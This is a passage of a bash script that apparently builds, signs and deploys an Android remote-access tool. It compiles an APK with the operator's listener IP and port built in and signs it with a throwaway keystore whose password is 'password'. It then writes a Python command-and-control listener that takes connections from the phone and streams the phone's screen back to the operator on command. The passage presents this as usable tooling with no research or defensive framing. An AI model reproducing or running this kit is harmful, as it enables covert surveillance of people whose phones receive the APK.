# Build the APK using gradle wrapper
build_apk() {
    echo -e "${YELLOW}[5/8] Building APK with Gradle 8.6 wrapper...${NC}"
    
    cd $PROJECT_DIR
    
    # Make gradlew executable
    chmod +x gradlew
    
    # Build the APK
    echo "Running ./gradlew assembleRelease..."
    ./gradlew assembleRelease --no-daemon
    
    # Check if build succeeded
    if [ -f "app/build/outputs/apk/release/app-release.apk" ]; then
        cp app/build/outputs/apk/release/app-release.apk "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
        echo -e "${GREEN}✓ APK built successfully${NC}"
        echo "APK saved to: $HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk"
    else
        echo -e "${RED}Failed to build APK${NC}"
        exit 1
    fi
}

# Sign the APK
sign_apk() {
    echo -e "${YELLOW}[6/8] Signing APK...${NC}"
    
    cd $HOME
    
    if [ ! -f "my-release-key.jks" ]; then
        keytool -genkey -v -keystore my-release-key.jks -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -storepass password -keypass password -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" 2>/dev/null
    fi
    
    apksigner sign --ks my-release-key.jks --ks-pass pass:password --key-pass pass:password "$HOME/remote-access-$LISTENER_IP-$LISTENER_PORT.apk" 2>/dev/null
    
    echo -e "${GREEN}✓ APK signed${NC}"
}

# Create listener script
create_listener() {
    echo -e "${YELLOW}[7/8] Creating listener...${NC}"
    
    cat > ~/android-listener.py << EOF
#!/usr/bin/env python3
import socket
import threading
import cv2
import numpy as np
import struct
import tkinter as tk
from PIL import Image, ImageTk
import queue

LISTENER_IP = "$LISTENER_IP"
LISTENER_PORT = $LISTENER_PORT

class ScreenViewer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Android Screen Viewer")
        self.root.geometry("800x600")
        self.canvas = tk.Canvas(self.root, bg='black')
        self.canvas.pack(fill=tk.BOTH, expand=True)
        self.image_queue = queue.Queue()
        self.update()
    
    def update(self):
        try:
            img = self.image_queue.get_nowait()
            if img is not None:
                window_width = self.root.winfo_width()
                window_height = self.root.winfo_height()
                if window_width > 1 and window_height > 1:
                    img_resized = cv2.resize(img, (window_width, window_height))
                    img_rgb = cv2.cvtColor(img_resized, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(img_rgb)
                    img_tk = ImageTk.PhotoImage(img_pil)
                    self.canvas.delete("all")
                    self.canvas.create_image(0, 0, anchor=tk.NW, image=img_tk)
                    self.canvas.image = img_tk
        except queue.Empty:
            pass
        self.root.after(50, self.update)
    
    def show(self):
        self.root.mainloop()

class RemoteClient:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.running = True
        self.streaming = False
        self.viewer = None
    
    def handle(self):
        print(f"\n[+] Connected to {self.addr}")
        threading.Thread(target=self.command_loop).start()
        
        while self.running:
            try:
                if self.streaming:
                    size_data = self.conn.recv(4)
                    if not size_data: continue
                    img_size = struct.unpack('!I', size_data)[0]
                    
                    img_data = b''
                    remaining = img_size
                    while remaining > 0:
                        chunk = self.conn.recv(min(8192, remaining))
                        img_data += chunk
                        remaining -= len(chunk)
                    
                    img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
                    if img is not None and self.viewer:
                        self.viewer.image_queue.put(img)
            except: break
        
        self.conn.close()
        print(f"[-] Disconnected")
    
    def command_loop(self):
        while self.running:
            cmd = input(f"\033[92m{self.addr[0]}>\033[0m ")
            if cmd == "stream":
                self.conn.send(b"START_STREAM\n")
                self.streaming = True
                self.viewer = ScreenViewer()
                threading.Thread(target=self.viewer.show).start()
                print("[*] Streaming started")
            elif cmd == "stop":
                self.conn.send(b"STOP_STREAM\n")
                self.streaming = False
                if self.viewer: self.viewer.root.quit()
            elif cmd == "exit":
                self.conn.send(b"EXIT\n")
                self.running = False
                break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTENER_IP, LISTENER_PORT))
    server.listen(5)
    print(f"\nListening on {LISTENER_IP}:{LISTENER_PORT}\n")
    
    while True:
        conn, addr = server.accept()
        RemoteClient(conn, addr).handle()

if __name__ == "__main__":
    start_server()
EOF

    chmod +x ~/android-listener.py
    echo -e "${GREEN}✓ Listener created${NC}"
}

